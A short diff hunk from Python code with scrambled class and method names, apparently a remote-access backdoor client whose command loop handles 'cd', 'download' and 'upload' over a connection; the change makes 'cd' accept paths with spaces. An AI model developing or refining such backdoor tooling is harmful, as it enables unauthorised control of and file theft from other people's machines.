@@ -54,7 +54,7 @@ class dtf2un:
                         self.sp.close()
                         break
                     elif command[0] == "cd" and len(command) > 1:
-                        result = self.fz2v9t(command[1])
+                        result = self.fz2v9t(" ".join(command[1:]))
                     elif command[0] == "download":
                         result = self.qzwu9g(command[1])
                     elif command[0] == "upload":
